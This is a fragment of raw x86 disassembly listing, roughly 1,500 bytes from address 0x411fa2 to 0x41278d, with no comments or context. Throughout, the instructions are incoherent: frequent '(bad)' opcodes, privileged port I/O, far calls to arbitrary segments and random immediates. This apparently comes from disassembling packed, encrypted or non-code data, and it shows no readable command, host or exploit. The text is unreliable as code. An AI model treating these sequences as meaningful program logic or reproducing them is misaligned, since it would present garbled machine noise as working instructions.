  411fa2:	outs   dx,BYTE PTR ds:[esi]
  411fa3:	add    dl,BYTE PTR [ecx-0x1]
  411fa6:	pop    ebx
  411fa7:	cmp    edi,eax
  411fa9:	(bad)  
  411faa:	iret   
  411fab:	fild   QWORD PTR ss:[ebp-0x6f]
  411faf:	mov    esp,0xf97206db
  411fb4:	dec    edx
  411fb5:	xchg   esi,eax
  411fb6:	dec    ebx
  411fb7:	(bad)  
  411fb8:	pop    esi
  411fb9:	mov    ds,WORD PTR [edi+0x4e]
  411fbc:	jae    0x411fe2
  411fbe:	div    DWORD PTR [ecx]
  411fc0:	jmp    0x411f60
  411fc2:	das    
  411fc3:	xchg   ebp,eax
  411fc4:	mov    ch,0xc6
  411fc6:	les    eax,FWORD PTR [ecx+ebp*2-0x3b]
  411fca:	xchg   esp,eax
  411fcb:	adc    bh,0x78
  411fce:	aaa    
  411fcf:	cld    
  411fd0:	mov    cl,0x16
  411fd2:	(bad)  
  411fd3:	popa   
  411fd4:	int3   
  411fd5:	pushf  
  411fd6:	nop
  411fd7:	push   edi
  411fd8:	pop    eax
  411fd9:	mov    edx,0x8756fd34
  411fde:	stos   BYTE PTR es:[edi],al
  411fdf:	fs pushf 
  411fe1:	xchg   bh,dh
  411fe3:	push   esp
  411fe4:	xor    eax,0xb3a4b3e2
  411fe9:	leave  
  411fea:	data16 sar BYTE PTR [edi-0x4e4dd2bf],1
  411ff1:	mov    eax,0xf98c662c
  411ff6:	sbb    ch,BYTE PTR [ebx]
  411ff8:	xchg   ebx,eax
  411ff9:	xchg   ecx,eax
  411ffa:	in     al,0xb4
  411ffc:	dec    ebp
  411ffd:	jo     0x41203d
  411fff:	mov    ecx,0x8407a62a
  412004:	and    ebx,DWORD PTR [ebp+0x6894b8bf]
  41200a:	jp     0x41202c
  41200c:	pop    ebx
  41200d:	add    al,0xd0
  41200f:	mov    ch,0xe4
  412011:	shl    ecx,0x25
  412014:	cwde   
  412015:	jae    0x411fd6
  412017:	dec    BYTE PTR ds:0x9243915c
  41201d:	sub    eax,0x195165bd
  412022:	sub    esi,ecx
  412024:	xchg   ebp,eax
  412025:	stos   BYTE PTR es:[edi],al
  412026:	xchg   BYTE PTR [ecx-0x3f],ch
  412029:	mov    WORD PTR [edi-0x6ab36813],cs
  41202f:	adc    eax,0x3ac70675
  412034:	jp     0x411ffd
  412036:	push   ss
  412037:	in     eax,dx
  412038:	dec    edx
  412039:	cmp    BYTE PTR [esi],bl
  41203b:	or     eax,ecx
  41203d:	push   ss
  41203e:	mov    ds:0x137d5e5d,eax
  412043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412044:	cmp    bh,dh
  412046:	in     al,0xb9
  412048:	inc    edi
  412049:	add    eax,edx
  41204b:	xchg   esp,eax
  41204c:	fdiv   DWORD PTR [eax+0x7b]
  41204f:	pushf  
  412050:	bound  edx,QWORD PTR [esi-0x1e]
  412053:	jp     0x412043
  412055:	sbb    ah,BYTE PTR [edi]
  412057:	aas    
  412058:	xor    esp,edx
  41205a:	jo     0x4120ae
  41205c:	fstp   QWORD PTR [ecx+0x5c]
  41205f:	inc    ebx
  412060:	imul   dl
  412062:	inc    esi
  412063:	cdq    
  412064:	adc    edx,DWORD PTR [eax+0x388352cb]
  41206a:	test   BYTE PTR [edx],dl
  41206c:	or     al,0x5e
  41206e:	jnp    0x4120ab
  412070:	lods   eax,DWORD PTR ds:[esi]
  412071:	sbb    DWORD PTR [edi-0x4341753d],ebp
  412077:	sar    DWORD PTR [edx],1
  412079:	push   ds
  41207a:	dec    edi
  41207b:	pop    ebx
  41207c:	popa   
  41207d:	aad    0xf5
  41207f:	retf   0x40ca
  412082:	mov    ebp,0xb8903ec4
  412087:	lahf   
  412088:	arpl   cx,sp
  41208a:	dec    ebp
  41208b:	xor    al,dh
  41208d:	out    dx,eax
  41208e:	ror    BYTE PTR [edx+0x283a2591],cl
  412094:	jecxz  0x4120af
  412096:	cld    
  412097:	fs jg  0x41207b
  41209a:	ret    
  41209b:	inc    esp
  41209c:	fbld   TBYTE PTR ss:[esi+ecx*1+0x2e]
  4120a1:	add    al,0x5
  4120a3:	test   eax,0xbc35d14d
  4120a8:	pop    ss
  4120a9:	jb     0x412033
  4120ab:	test   DWORD PTR [edi-0x29],ebp
  4120ae:	and    eax,0xa3cf4470
  4120b3:	(bad)  
  4120b4:	aaa    
  4120b5:	jmp    0x50106dbf
  4120ba:	mul    DWORD PTR [eax-0x54]
  4120bd:	dec    edx
  4120be:	enter  0xe97a,0x31
  4120c2:	jnp    0x4120f2
  4120c4:	pop    ecx
  4120c5:	jb     0x4120b2
  4120c7:	cmp    al,0x47
  4120c9:	(bad)  
  4120ca:	nop
  4120cb:	stos   BYTE PTR es:[edi],al
  4120cc:	aam    0x15
  4120ce:	mov    dl,0x38
  4120d0:	adc    bl,BYTE PTR [esi+ebp*8-0x345cd0fb]
  4120d7:	adc    esi,DWORD PTR [edi]
  4120d9:	jg     0x412119
  4120db:	jbe    0x4120fd
  4120dd:	data16 ss xchg ch,bh
  4120e1:	mov    ds:0x566f887d,eax
  4120e6:	lds    esi,FWORD PTR [esi+0x728cf081]
  4120ec:	aaa    
  4120ed:	shl    BYTE PTR [ecx+0x61],cl
  4120f0:	push   ds
  4120f1:	popa   
  4120f2:	lods   al,BYTE PTR ds:[esi]
  4120f3:	xor    BYTE PTR [edx-0x66],dh
  4120f6:	hlt    
  4120f7:	test   BYTE PTR [ecx+0x43395a3],0xfc
  4120fe:	dec    ebx
  4120ff:	dec    edi
  412100:	sub    al,0x91
  412102:	ss in  al,dx
  412104:	xor    eax,0xce258c87
  412109:	outs   dx,BYTE PTR ds:[esi]
  41210a:	jp     0x4120cf
  41210c:	sbb    BYTE PTR ds:0xb21a57c9,al
  412112:	test   edx,edx
  412114:	dec    edi
  412115:	shl    DWORD PTR [ebx],cl
  412117:	pop    edx
  412118:	popa   
  412119:	iret   
  41211a:	pushf  
  41211b:	mov    bl,BYTE PTR [edx-0x62b85b3f]
  412121:	xor    DWORD PTR [eax+0x45],ecx
  412124:	jecxz  0x4120ba
  412126:	push   edi
  412127:	jnp    0x4120e8
  412129:	out    0x7,eax
  41212b:	and    bh,BYTE PTR [ebx+edi*1+0x514b98a2]
  412132:	rcl    BYTE PTR [edi+edx*1],0x6d
  412136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412137:	mov    esi,DWORD PTR [ecx+eax*8+0x4e663b9c]
  41213e:	xchg   edx,edx
  412140:	dec    edi
  412141:	add    eax,0xe75584ad
  412146:	in     al,0xa
  412148:	add    BYTE PTR [ebx+ebx*8-0xb],bl
  41214c:	out    0x3,al
  41214e:	sub    al,0x19
  412150:	aaa    
  412151:	jo     0x41211e
  412153:	sub    DWORD PTR [edx],esi
  412155:	pop    edi
  412156:	cdq    
  412157:	xchg   esi,eax
  412158:	inc    esp
  412159:	mov    dl,0x4c
  41215b:	pop    edx
  41215c:	fcmovnb st,st(5)
  41215e:	sub    al,0x4
  412160:	inc    eax
  412161:	jmp    0x99ddf206
  412166:	cs das 
  412168:	dec    edi
  412169:	jo     0x412136
  41216b:	(bad)  
  41216c:	dec    esp
  41216d:	add    eax,0xec3cf03
  412172:	popa   
  412173:	das    
  412174:	psraw  mm3,QWORD PTR [eax+0x7dc92f51]
  41217b:	xchg   ebx,eax
  41217c:	xchg   DWORD PTR [esi],esp
  41217e:	pop    esp
  41217f:	mov    dl,0xf6
  412181:	call   0x1d45:0x5e38d169
  412188:	shl    DWORD PTR [ebx-0x436f7050],0xa3
  41218f:	jb     0x41213b
  412191:	ror    BYTE PTR [edi-0x5e],cl
  412194:	xchg   esp,eax
  412195:	je     0x412128
  412197:	and    al,BYTE PTR [eax+0x62]
  41219a:	std    
  41219b:	fbstp  TBYTE PTR [ecx+0x29]
  41219e:	cli    
  41219f:	das    
  4121a0:	mov    ss,WORD PTR [edi-0x2ea07784]
  4121a6:	stos   DWORD PTR es:[edi],eax
  4121a7:	xchg   edi,eax
  4121a8:	scas   al,BYTE PTR es:[edi]
  4121a9:	ret    
  4121aa:	and    edi,DWORD PTR [ebp+0x47430ec9]
  4121b0:	pop    ss
  4121b1:	xor    bl,BYTE PTR [esp+ebp*1-0x16]
  4121b5:	pop    ebx
  4121b6:	inc    edi
  4121b7:	fimul  WORD PTR [esi]
  4121b9:	mov    ds:0x37f19f61,al
  4121be:	mov    ebp,0x89edcb1b
  4121c3:	dec    ecx
  4121c4:	retf   0x3523
  4121c7:	pop    ds
  4121c8:	xchg   esp,eax
  4121c9:	cdq    
  4121ca:	cmp    eax,0xe6ae6efc
  4121cf:	xor    cl,BYTE PTR [esi+0x5af835c8]
  4121d5:	fcmovnbe st,st(0)
  4121d7:	loop   0x4121a4
  4121d9:	pop    es
  4121da:	mov    BYTE PTR [ebx],dh
  4121dc:	gs sub eax,0x7d104a49
  4121e2:	iret   
  4121e3:	mov    bl,0x1d
  4121e5:	leave  
  4121e6:	cli    
  4121e7:	jl     0x412231
  4121e9:	ins    DWORD PTR es:[edi],dx
  4121ea:	sti    
  4121eb:	dec    edi
  4121ec:	cli    
  4121ed:	mov    al,ds:0x3fcddcd6
  4121f2:	xchg   ecx,eax
  4121f3:	scas   eax,DWORD PTR es:[edi]
  4121f4:	adc    DWORD PTR [ebx+0x4d],esp
  4121f7:	or     bl,BYTE PTR [eax-0x28558b29]
  4121fd:	adc    DWORD PTR [edx+0x50d740d9],esi
  412203:	in     al,dx
  412204:	mov    es,eax
  412206:	pop    ebp
  412207:	test   eax,0x412e7f8b
  41220c:	or     DWORD PTR [ecx],edx
  41220e:	add    al,BYTE PTR [esi-0xe]
  412211:	dec    edx
  412212:	(bad)  
  412214:	mov    ebx,0x60149207
  412219:	lea    esp,[ebx+0x6981b119]
  41221f:	or     edi,ebx
  412221:	mov    cl,BYTE PTR [ebx+0x11]
  412224:	push   eax
  412225:	int3   
  412226:	xchg   ebp,eax
  412227:	or     ebp,DWORD PTR [edi+0x5138439]
  41222d:	fstp   QWORD PTR [ecx-0x6a52ab6e]
  412233:	(bad)  
  412234:	and    edx,ebp
  412236:	or     BYTE PTR [eax+0x727c9789],bl
  41223c:	push   0x6a77d7bd
  412241:	in     al,dx
  412242:	aam    0x91
  412244:	sbb    eax,0xf061208f
  412249:	in     al,dx
  41224a:	xchg   esi,eax
  41224b:	sub    dl,BYTE PTR [edx]
  41224d:	xchg   ebx,eax
  41224e:	pop    esi
  41224f:	stos   DWORD PTR es:[edi],eax
  412250:	xchg   esp,eax
  412251:	adc    BYTE PTR [edi-0xb],0xd5
  412255:	sbb    bh,al
  412257:	and    DWORD PTR [ecx+0x17],esp
  41225a:	adc    DWORD PTR [eax+edi*2-0x435fff0f],ebx
  412261:	jg     0x41226a
  412263:	pop    ebx
  412264:	in     eax,dx
  412265:	aaa    
  412266:	push   0x12c7bd33
  41226b:	and    esi,DWORD PTR [ebp+0x56a292b0]
  412271:	xrelease xchg DWORD PTR [ecx+0x32db8542],edx
  412278:	mov    ebp,eax
  41227a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41227b:	fs enter 0xcf8a,0xe8
  412280:	dec    ebp
  412281:	retf   
  412282:	shl    BYTE PTR [esi+ecx*1-0x561bb42e],0x15
  41228a:	cmp    edx,DWORD PTR [edi]
  41228c:	dec    ebp
  41228d:	xchg   edi,eax
  41228e:	jg     0x412263
  412290:	nop
  412291:	cli    
  412292:	test   BYTE PTR [eax-0x3d0cc587],bh
  412298:	daa    
  412299:	mov    esi,0x20ac2d84
  41229e:	sbb    DWORD PTR [ebx-0x3bfdb58],edx
  4122a4:	repz mov bl,0xc5
  4122a7:	mov    WORD PTR [edi+0x62],fs
  4122aa:	jmp    0x4122f0
  4122ac:	lock repz mov cl,0xee
  4122b0:	xchg   ecx,eax
  4122b1:	mov    BYTE PTR [edi+0x2660b1fe],cl
  4122b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122b8:	dec    edx
  4122b9:	adc    dh,bl
  4122bb:	jecxz  0x412319
  4122bd:	mov    esi,0x566d1159
  4122c2:	into   
  4122c3:	sbb    ah,BYTE PTR [eax+0x6feccb46]
  4122c9:	sbb    ah,BYTE PTR [ecx]
  4122cb:	out    dx,eax
  4122cc:	mov    al,BYTE PTR [ebp+edi*2-0x54]
  4122d0:	cmp    al,0x98
  4122d2:	inc    esp
  4122d3:	xchg   ebp,eax
  4122d4:	xchg   edi,eax
  4122d5:	sub    bh,BYTE PTR [edx]
  4122d7:	mov    edi,DWORD PTR [edx+0x4f]
  4122da:	jl     0x4122dd
  4122dc:	pop    esi
  4122dd:	popf   
  4122de:	call   0x6213:0x5e9a8734
  4122e5:	jp     0x412321
  4122e7:	mov    ch,0xdc
  4122e9:	dec    BYTE PTR [ebx-0xe]
  4122ec:	out    dx,al
  4122ed:	inc    eax
  4122ee:	cmp    ah,BYTE PTR [ecx-0x46]
  4122f1:	sbb    ebx,ebp
  4122f3:	mov    eax,0x27509e9a
  4122f8:	icebp  
  4122f9:	lahf   
  4122fa:	sbb    ebx,ebp
  4122fc:	or     DWORD PTR ds:0xece4b808,esp
  412302:	push   es
  412303:	mov    al,0xc6
  412305:	call   0xb503:0xd422c9ca
  41230c:	arpl   WORD PTR [ebp-0x171fbc70],ax
  412312:	mov    ds:0x4d06895e,eax
  412317:	push   ecx
  412318:	inc    ebp
  412319:	mov    dl,0x2a
  41231b:	jno    0x4122fc
  41231d:	add    al,0xf3
  41231f:	xchg   edi,eax
  412320:	repnz mov bl,0x2a
  412323:	mov    ebx,0x723cc9af
  412328:	imul   edi,DWORD PTR [edi+0x4483a2e1],0x7d93573b
  412332:	iret   
  412333:	call   0x3a0d9bf5
  412338:	test   al,0xaa
  41233a:	mov    al,ds:0x84fff4c2
  41233f:	inc    ecx
  412340:	xchg   esp,eax
  412341:	sbb    cl,BYTE PTR [eax+ebx*4]
  412344:	push   esp
  412345:	fs aaa 
  412347:	push   ebp
  412348:	retf   0xc73e
  41234b:	jl     0x41238c
  41234d:	inc    eax
  41234e:	(bad)  
  41234f:	cmp    ecx,DWORD PTR [edi-0x66ec50a2]
  412355:	add    eax,0x2d3295ff
  41235a:	ss cdq 
  41235c:	or     bl,ah
  41235e:	inc    edi
  41235f:	sbb    BYTE PTR [edi-0x1dfac67b],dl
  412365:	out    dx,eax
  412366:	test   al,0x35
  412368:	iret   
  412369:	pop    ecx
  41236a:	(bad)  ds:0xb7b712c
  412370:	xchg   BYTE PTR [edi-0x70],cl
  412373:	pop    ebx
  412374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412376:	iret   
  412377:	dec    edx
  412378:	mov    fs,WORD PTR [edi-0xb732251]
  41237e:	ja     0x41238e
  412380:	daa    
  412381:	mov    ah,0xd6
  412383:	int3   
  412384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412385:	sub    BYTE PTR [ecx],0x8b
  412388:	call   0x21c9712
  41238d:	dec    ebp
  41238e:	scas   eax,DWORD PTR es:[edi]
  41238f:	lods   eax,DWORD PTR ds:[esi]
  412390:	(bad)  
  412393:	rol    BYTE PTR [edi+0x13],cl
  412396:	sub    al,0x93
  412398:	jp     0x41239f
  41239a:	ds mov bh,0xcb
  41239d:	fnstsw WORD PTR [ebp+0x1b]
  4123a0:	and    ebp,DWORD PTR [esp+esi*8-0x7c]
  4123a4:	pop    ds
  4123a5:	dec    edi
  4123a6:	mov    ds:0xb2d81a36,eax
  4123ab:	xor    DWORD PTR [edx],esp
  4123ad:	loope  0x4123b2
  4123af:	loop   0x4123f4
  4123b1:	popa   
  4123b2:	or     BYTE PTR ds:0xc0609092,dh
  4123b8:	clc    
  4123b9:	add    ah,BYTE PTR [ebx-0x6c32cd39]
  4123bf:	cli    
  4123c0:	ret    0x9f6b
  4123c3:	pop    ss
  4123c4:	mov    BYTE PTR [eax-0x55],al
  4123c7:	mov    ebx,0xbdc227fc
  4123cc:	pop    esi
  4123cd:	ja     0x4123ba
  4123cf:	test   eax,0x4bc1db71
  4123d4:	inc    edx
  4123d5:	adc    BYTE PTR [eax+0x6ab9e0b1],dl
  4123db:	or     dl,dh
  4123dd:	(bad)  
  4123df:	call   0xc973f031
  4123e4:	mov    al,0xcf
  4123e6:	(bad)  
  4123e7:	repnz xor BYTE PTR [ecx],dh
  4123ea:	pop    edx
  4123eb:	push   es
  4123ec:	es je  0x4123cd
  4123ef:	jmp    0x4845:0xb472a2b7
  4123f6:	mov    bl,0xaf
  4123f8:	mov    al,0xa1
  4123fa:	add    ch,ch
  4123fc:	jbe    0x412466
  4123fe:	mov    ebp,DWORD PTR [esi]
  412400:	sbb    BYTE PTR [eax-0x14],ch
  412403:	sub    al,0xd4
  412405:	xor    al,0xc5
  412407:	cmp    eax,0xf89f8dd3
  41240c:	sub    ch,BYTE PTR [esi+0x39]
  41240f:	or     DWORD PTR [ebp+0x6001ecc3],0xb9565bce
  412419:	cmp    dh,BYTE PTR [edx+0x335480e7]
  41241f:	mov    al,BYTE PTR [edx+0x5f10ab9]
  412425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412426:	pushf  
  412427:	in     al,dx
  412428:	inc    ebp
  412429:	popf   
  41242a:	adc    DWORD PTR [edi+eiz*2+0x42],edx
  41242e:	retf   
  41242f:	pusha  
  412430:	or     edx,eax
  412432:	xchg   edi,eax
  412433:	push   0x35
  412435:	pop    ss
  412436:	(bad)  
  412437:	call   0x24b6697
  41243c:	pop    es
  41243d:	jge    0x4123fd
  41243f:	fs dec edx
  412441:	int3   
  412442:	arpl   dx,dx
  412444:	xor    eax,0x190b63e3
  412449:	xchg   esi,eax
  41244a:	xor    BYTE PTR [ebx-0x5489cea5],al
  412450:	aaa    
  412451:	or     esp,esp
  412453:	fldcw  WORD PTR ds:[eax+eax*8+0x7f]
  412458:	(bad)  
  412459:	(bad)  
  41245a:	jo     0x41244e
  41245c:	in     eax,dx
  41245d:	sub    al,ch
  41245f:	inc    esp
  412460:	pop    eax
  412461:	add    ch,bh
  412463:	(bad)  
  412464:	loope  0x4123fb
  412466:	mov    bh,dl
  412468:	je     0x412456
  41246a:	mov    eax,ds:0x9aeec6be
  41246f:	pop    ds
  412470:	call   0x923ce474
  412475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412476:	nop
  412477:	lods   al,BYTE PTR ds:[esi]
  412478:	pop    ebp
  412479:	jge    0x412405
  41247b:	nop
  41247c:	or     BYTE PTR [ebx],bh
  41247e:	jp     0x41242e
  412480:	aaa    
  412481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412482:	js     0x41242f
  412484:	adc    ebp,edx
  412486:	fisttp DWORD PTR [esi+0x1e]
  412489:	push   ds
  41248a:	sahf   
  41248b:	inc    ecx
  41248c:	sub    al,0x52
  41248e:	and    bl,BYTE PTR [esp+ecx*8]
  412491:	scas   al,BYTE PTR es:[edi]
  412492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412493:	(bad)  
  412494:	idiv   BYTE PTR [esi-0x2263e316]
  41249a:	outs   dx,BYTE PTR ds:[esi]
  41249b:	jo     0x4124c1
  41249d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41249e:	in     al,dx
  41249f:	jge    0x41245e
  4124a1:	mov    BYTE PTR [esi+0x45],dh
  4124a4:	mov    ?,WORD PTR [eax]
  4124a6:	repz inc esp
  4124a8:	dec    ecx
  4124a9:	pop    ebp
  4124aa:	nop
  4124ab:	jl     0x412474
  4124ad:	jecxz  0x412503
  4124af:	jae    0x412483
  4124b1:	cmp    eax,0x211161eb
  4124b6:	mov    esp,ecx
  4124b8:	fcomp  QWORD PTR [ebx+0x7e]
  4124bb:	add    ebx,DWORD PTR [edi+edx*4+0x16]
  4124bf:	mov    bh,0x7e
  4124c1:	cmp    ah,dh
  4124c3:	mov    DWORD PTR [ebp+0x6e],esp
  4124c6:	jmp    0xa07368f1
  4124cb:	push   eax
  4124cc:	(bad)  [ebx+0x547acfbb]
  4124d2:	push   edi
  4124d3:	imul   edi,ebx,0xd8fca45f
  4124d9:	inc    esi
  4124da:	mov    edx,edx
  4124dc:	rcl    esi,1
  4124de:	ja     0x412527
  4124e0:	test   DWORD PTR [esi],0xf0d0a27
  4124e6:	loop   0x4124e2
  4124e8:	jne    0x4124dc
  4124ea:	and    eax,0x9243d6ca
  4124ef:	or     ebp,edi
  4124f1:	mov    dl,0xf
  4124f3:	imul   ebx,DWORD PTR [esi+0x44dc872b],0x5a660ed5
  4124fd:	outs   dx,DWORD PTR ds:[esi]
  4124fe:	sub    BYTE PTR ds:0x69ae30c8,0x5f
  412505:	and    ch,BYTE PTR [ecx+0x43]
  412508:	mov    dl,0x63
  41250a:	ss push ds
  41250c:	ja     0x41251c
  41250e:	jl     0x4124ac
  412510:	mov    ds:0xd6b71c6e,al
  412515:	jns    0x4124f4
  412517:	mov    esp,0xd5371cc
  41251c:	xchg   esp,eax
  41251d:	cmp    DWORD PTR [edx+0x559320ef],esi
  412523:	call   0x2e03:0x625f264b
  41252a:	mov    ?,WORD PTR [edx+eax*1+0xd]
  41252e:	pop    ds
  41252f:	mov    gs,eax
  412531:	lods   eax,DWORD PTR ds:[esi]
  412532:	mov    ds:0x100ac3fd,eax
  412537:	idiv   esi
  412539:	or     ebp,ebx
  41253b:	out    dx,eax
  41253c:	nop
  41253d:	pop    esp
  41253e:	std    
  41253f:	inc    BYTE PTR [edi+0x27ec3aa5]
  412545:	adc    bl,ch
  412547:	or     eax,DWORD PTR [esi+0x11414111]
  41254d:	jb     0x4125bd
  41254f:	xchg   ecx,eax
  412550:	pop    edx
  412551:	xor    BYTE PTR [eax+0x4bef6045],dh
  412557:	jo     0x41250b
  412559:	push   ebx
  41255a:	test   eax,0x129ea54c
  41255f:	mov    ebp,0x58a857fd
  412564:	lahf   
  412565:	adc    BYTE PTR [edi+eax*4],0x24
  412569:	xchg   ecx,eax
  41256a:	fs jmp 0xb4e24df
  412570:	icebp  
  412571:	xlat   BYTE PTR ds:[ebx]
  412572:	mov    ch,bl
  412574:	xor    al,ah
  412576:	pop    ds
  412577:	mov    al,0x30
  412579:	mov    ch,0xc1
  41257b:	sbb    ebp,DWORD PTR [eax]
  41257d:	nop
  41257e:	xchg   BYTE PTR [edi+edx*8+0x62],ch
  412582:	mov    bl,0x8b
  412584:	aam    0x2f
  412586:	arpl   WORD PTR [eax],sp
  412588:	ror    BYTE PTR [eax+0x4d],cl
  41258b:	ficom  WORD PTR [eax-0x5e58f31c]
  412591:	jl     0x412533
  412593:	or     ah,cl
  412595:	ret    
  412596:	and    dl,BYTE PTR [esp+ebp*2-0x40]
  41259a:	imul   ebp,ebp,0xb61f4964
  4125a0:	push   esp
  4125a1:	stc    
  4125a2:	test   DWORD PTR ds:0xb925479d,ebp
  4125a8:	pop    ss
  4125a9:	iret   
  4125aa:	retf   0xfcba
  4125ad:	pop    edx
  4125ae:	das    
  4125af:	nop
  4125b0:	ret    
  4125b1:	dec    esp
  4125b2:	and    edi,ebx
  4125b4:	sub    ebp,DWORD PTR [edx*8+0x177d57d3]
  4125bb:	mov    ebx,eax
  4125bd:	jbe    0x4125c6
  4125bf:	mov    ax,es
  4125c2:	test   eax,0x727e09c0
  4125c7:	adc    BYTE PTR [ebx-0x6d7842e9],ch
  4125cd:	test   al,0xb6
  4125cf:	push   ecx
  4125d0:	sub    eax,0xc5934273
  4125d5:	mov    ah,0x7a
  4125d7:	pop    esi
  4125d8:	out    dx,eax
  4125d9:	std    
  4125da:	popa   
  4125db:	fwait
  4125dc:	inc    ecx
  4125dd:	sbb    al,BYTE PTR [ebp+ecx*1+0x68e20033]
  4125e4:	inc    edi
  4125e5:	push   edi
  4125e6:	mov    eax,0x2fa49fa0
  4125eb:	cmp    DWORD PTR [ebx-0x6c],ecx
  4125ee:	in     al,dx
  4125ef:	sbb    esp,esi
  4125f1:	outs   dx,DWORD PTR ds:[esi]
  4125f2:	adc    edi,DWORD PTR [eax+0x59]
  4125f5:	dec    edx
  4125f6:	nop
  4125f7:	in     eax,0x15
  4125f9:	pop    ds
  4125fa:	jp     0x412657
  4125fc:	repz shr BYTE PTR [ebp+0x779c3d2d],1
  412603:	mov    es,WORD PTR [ebp-0x7e]
  412606:	add    al,BYTE PTR [edi]
  412608:	or     DWORD PTR es:[edx+0x346985c2],ecx
  41260f:	push   ds
  412610:	ds das 
  412612:	sbb    DWORD PTR [edi+0x2be87100],0xffffffdd
  412619:	ds inc ebx
  41261b:	jmp    0x41261f
  41261d:	dec    esi
  41261e:	ret    
  41261f:	sub    al,0xca
  412621:	mov    ds:0x1f1d488b,al
  412626:	xchg   edx,eax
  412627:	dec    ebx
  412628:	aas    
  412629:	lds    edx,FWORD PTR [edx-0x6ce60e4]
  41262f:	or     edi,DWORD PTR ds:0x6a798df0
  412635:	ret    
  412636:	int3   
  412637:	cli    
  412638:	cmp    eax,0x75b48607
  41263d:	xor    edi,DWORD PTR [ecx]
  41263f:	sahf   
  412640:	add    eax,0x90ecf6e8
  412645:	push   esi
  412646:	push   ebp
  412647:	sbb    eax,0xb6069d58
  41264c:	adc    esi,esi
  41264e:	sub    BYTE PTR [esi],cl
  412650:	mov    esp,0x68e07d9e
  412655:	aas    
  412656:	call   0xdea2:0x4d55e7af
  41265d:	adc    cl,bh
  41265f:	nop
  412660:	daa    
  412661:	sub    esp,ecx
  412663:	out    dx,eax
  412664:	jo     0x4126b7
  412666:	cmp    eax,0x10ae3de0
  41266b:	div    DWORD PTR [edx+esi*2+0x48]
  41266f:	in     al,dx
  412670:	test   BYTE PTR [ebp+0x1185f76a],bl
  412676:	push   ebx
  412677:	push   ebx
  412678:	pop    ebp
  412679:	or     BYTE PTR [edi+0x18530629],0xc8
  412680:	xor    eax,0x828ffcad
  412685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412686:	jne    0x4126c9
  412688:	pop    edi
  412689:	sub    edx,DWORD PTR [esi+0x73110159]
  41268f:	xor    BYTE PTR [ecx-0x644a962a],ch
  412695:	scas   eax,DWORD PTR es:[edi]
  412696:	(bad)  
  412697:	cmc    
  412698:	int3   
  412699:	lea    edx,[esi-0x2a175de4]
  41269f:	rcl    DWORD PTR [ebx-0x16],0x8c
  4126a3:	test   BYTE PTR [ecx+0x26],0xfa
  4126a7:	or     bh,bl
  4126a9:	push   ebx
  4126aa:	arpl   WORD PTR [ecx+esi*8+0x30570c9a],si
  4126b1:	cld    
  4126b2:	jnp    0x4126bc
  4126b4:	and    eax,0x31f62dec
  4126b9:	dec    edx
  4126ba:	cmp    BYTE PTR [eax-0x6c],dh
  4126bd:	pop    es
  4126be:	or     ebp,DWORD PTR [edx-0xaa25c14]
  4126c4:	add    bh,dl
  4126c6:	pop    ebp
  4126c7:	sbb    eax,0xaf108b7e
  4126cc:	jb     0x412693
  4126ce:	add    eax,0x46f61ae2
  4126d3:	sbb    cl,BYTE PTR ds:0x355a498d
  4126d9:	sub    cl,BYTE PTR [ebp+0x7ae476e2]
  4126df:	imul   edi,DWORD PTR [ebp+0x26],0x933d2bb4
  4126e6:	ins    DWORD PTR es:[edi],dx
  4126e7:	je     0x412707
  4126e9:	mov    bh,0xa5
  4126eb:	stos   DWORD PTR es:[edi],eax
  4126ec:	neg    BYTE PTR [ebp-0x6c]
  4126ef:	pop    ds
  4126f0:	stos   BYTE PTR es:[edi],al
  4126f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f2:	pop    eax
  4126f3:	es xchg ecx,eax
  4126f5:	xor    edi,DWORD PTR [eax+0x72f501e0]
  4126fb:	lahf   
  4126fc:	jbe    0x41275f
  4126fe:	sbb    al,0xc1
  412700:	inc    ecx
  412701:	mov    cl,0xfb
  412703:	dec    esi
  412704:	(bad)  [ecx-0x66]
  412707:	hlt    
  412708:	or     BYTE PTR [ebx-0x7b],0xb6
  41270c:	xchg   edx,eax
  41270d:	xchg   ebx,eax
  41270e:	push   es
  41270f:	lods   eax,DWORD PTR ds:[esi]
  412710:	mov    eax,ds:0x7dd7143
  412715:	xchg   ebp,eax
  412716:	mov    edx,0x3d0db475
  41271b:	mov    eax,0x3836ed35
  412720:	xchg   ebx,eax
  412721:	jecxz  0x412786
  412723:	imul   edi,DWORD PTR [edi],0xffffffd6
  412726:	mov    esi,0xf51f8296
  41272b:	jecxz  0x41276f
  41272d:	(bad)  
  41272e:	and    al,0x7e
  412730:	inc    ecx
  412731:	out    dx,al
  412732:	out    0xa2,eax
  412734:	daa    
  412735:	(bad)
  412738:	mov    dl,0xa8
  41273a:	out    dx,eax
  41273b:	adc    edx,DWORD PTR [ecx+edx*8]
  41273e:	int    0x89
  412740:	mov    ch,0x39
  412742:	pop    esi
  412743:	sub    ebx,DWORD PTR [ecx]
  412745:	cwde   
  412746:	cmp    edx,ecx
  412748:	data16 jo 0x4126fb
  41274b:	jmp    0x60c36fc
  412750:	pop    edi
  412751:	add    DWORD PTR [edi],edx
  412753:	lds    esp,FWORD PTR [ebx-0x431d1653]
  412759:	fld    QWORD PTR [ebp-0x45251fae]
  41275f:	fistp  DWORD PTR [edx]
  412761:	ds in  eax,dx
  412763:	int    0x3d
  412765:	jae    0x4127d2
  412767:	aam    0x2f
  412769:	stos   BYTE PTR es:[edi],al
  41276a:	test   ebx,0x2b87b4a4
  412770:	mov    bl,0xc6
  412772:	fs mov dl,0xb5
  412775:	frstor [eax+0x3fb56435]
  41277b:	into   
  41277c:	retf   0x6ab5
  41277f:	xchg   ecx,eax
  412780:	dec    ebp
  412781:	mov    bl,BYTE PTR es:[ebx]
  412784:	sub    dl,BYTE PTR [eax]
  412786:	add    eax,0x498ff1fb
  41278b:	mov    ch,0x56
  41278d:	pop    ss
